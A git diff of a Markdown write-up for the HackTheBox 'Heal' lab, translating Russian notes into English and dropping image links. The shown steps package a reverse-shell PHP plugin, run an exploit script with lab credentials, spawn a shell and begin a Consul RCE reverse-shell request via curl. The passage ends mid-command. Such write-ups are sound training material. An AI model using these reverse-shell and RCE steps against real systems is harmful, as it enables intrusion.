@@ -107,16 +107,12 @@ There are two files: `config.xml` and `revshell.php`. They need to be packed int
 zip -r ReverseShellPlugin.zip config.xml revshell.php
 ```
 
-![image](images/20250404203158.png)
-
 ![image](images/20250404203227.png)
 
 Run the script to enter the `reverse shell`
 ```bash
 python exploit.py http://take-survey.heal.htb ralph 147258369 80
 ```
-
-![image](images/202t50404210223.png)
 
 ```bash
 python3 -c 'import pty; pty.spawn(“/bin/bash”)'
@@ -162,18 +158,18 @@ netstat -lntp
 <div style="page-break-after: always;"></div>
 
 - **5432** — PostgreSQL.
-- **3000, 3001** — Возможно, Node.js, Rails, или другие веб-приложения.
-- **8500, 8503, 8600, 8300-8302** — Порты Consul (система для управления сервисами и конфигурациями)
-Исследуем порт `8500`:
+- **3000, 3001** — Possibly Node.js, Rails, or other web applications.
+- **8500, 8503, 8600, 8300-8302** — Consul ports (service and configuration management system)
+Let's examine port `8500`:
 ```bash
 curl http://localhost:8500
 ```
-Видим вывод
+We see the output
 ```HTML
 <a href="/ui/">Moved Permanently</a>
 ```
-Это означает, что сервер `Consul` (работающий на порту 8500) перенаправляет запросы с корневого пути `/` на веб-интерфейс `/ui/`.
-Попробуем проэксплуатировать RCE на `Consul` через `curl`. Отправим `reverse shell`
+This means that the `Consul` server (running on port 8500) redirects requests from the root path `/` to the web interface `/ui/`.
+Let's try to exploit RCE on `Consul` via `curl`. Let's send a `reverse shell`
 ```bash
 curl -X PUT -d '{
     “ID”: “rc”,
